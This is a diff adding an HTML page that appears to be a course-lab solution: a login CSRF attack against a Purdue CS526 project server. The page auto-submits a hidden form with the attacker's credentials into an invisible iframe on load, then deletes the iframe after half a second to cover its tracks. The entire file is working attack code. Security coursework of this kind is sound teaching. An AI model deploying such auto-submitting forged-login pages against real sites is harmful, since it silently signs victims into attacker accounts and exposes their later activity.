@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <iframe name="frame0" style="display: none;"></iframe>
+    <form action="http://cs526-online.cs.purdue.edu/project2b/login?csrfdefense=0&xssdefense=4" method="post" id="form0" target="frame0">
+        <input type="hidden" name="username" value="attacker">
+        <input type="hidden" name="password" value="123456">
+    </form>
+    <script>
+        document.getElementById("form0").submit();
+        setTimeout(()=>{ // remove the iframe after 1/2 a sec
+            document.querySelector('iframe[name="frame0"]').remove();
+        }, 500);
+    </script>
+</body>
+</html>
